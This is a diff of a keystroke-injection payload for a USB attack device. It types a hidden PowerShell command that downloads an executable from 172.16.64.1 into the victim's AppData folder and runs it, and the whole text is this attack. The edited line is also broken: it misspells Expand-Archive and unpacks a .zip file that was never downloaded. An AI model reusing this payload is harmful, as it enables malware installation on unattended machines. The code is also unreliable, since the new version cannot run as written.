@@ -27,7 +27,7 @@ QUACK DELAY 500
 QUACK STRING "powershell.exe -NoP -NonI -NoExit"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING "Invoke-WebRequest -Uri \"http://172.16.64.1/peepee.exe\" -OutFile \"\$env:APPDATA\\peepee.exe\"; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 3; Start-Process \"\$env:APPDATA\\peepee.exe\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 3; exit }"
+QUACK STRING "Invoke-WebRequest -Uri \"http://172.16.64.1/peepee.exe\" -OutFile \"\$env:APPDATA\\peepee.exe\"; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 3; Exapand-Archive -Path \"\$env:APPDATA\\peepee.zip\" -DestinationPath \"\$env:APPDATA\\peepee\"; Start-Process \"\$env:APPDATA\\peepee\\peepee.exe\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 3; exit }"
 QUACK ENTER
 
 LED FINISH
